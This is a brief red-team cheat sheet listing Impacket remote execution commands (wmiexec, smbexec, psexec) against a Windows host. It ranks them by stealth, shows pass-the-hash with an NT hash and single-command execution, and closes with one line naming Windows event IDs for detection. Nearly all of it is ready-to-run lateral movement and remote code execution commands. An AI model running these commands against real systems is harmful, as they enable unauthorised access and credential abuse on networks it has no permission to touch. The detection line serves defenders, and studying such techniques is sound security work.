# Impacket Remote Execution Tools

```bash
# wmiexec - stealthiest, no service created
wmiexec.py domain/user:pass@10.10.10.10

# smbexec - creates service, more noisy
smbexec.py domain/user:pass@10.10.10.10

# psexec - creates service, drops RemComSvc binary
psexec.py domain/user:pass@10.10.10.10

# With hash (pass-the-hash)
wmiexec.py -hashes :NTHASH domain/user@10.10.10.10

# Execute single command
wmiexec.py domain/user:pass@10.10.10.10 'whoami /groups'
```

Detection: Event ID 4624 (logon), 4688 (process creation). psexec also triggers 7045 (service install).
